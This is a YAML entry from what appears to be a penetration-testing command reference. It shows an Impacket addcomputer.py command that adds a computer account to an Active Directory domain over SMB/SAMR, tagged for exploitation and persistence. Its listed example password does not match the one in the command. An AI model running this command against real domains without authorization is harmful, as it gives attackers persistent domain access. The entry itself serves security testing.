---
title: |
  Add computer to the domain using SMB
description: |
  Impacket's addcomputer.py will add a computer account to the domain and set its password. The following command will create a new computer over the SMB by specifying the `SAMR` method.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	New Computer Password: Welkom01!

  	New Computer Name: testComputer

  	Username: test

  	Password: Welkom01!

command: |
  python3 addcomputer.py -method SAMR -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/test:Welkom01!
items:
  - Username
  - Password
services:
  - SMB
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
  - Persistence
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
  - http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
---
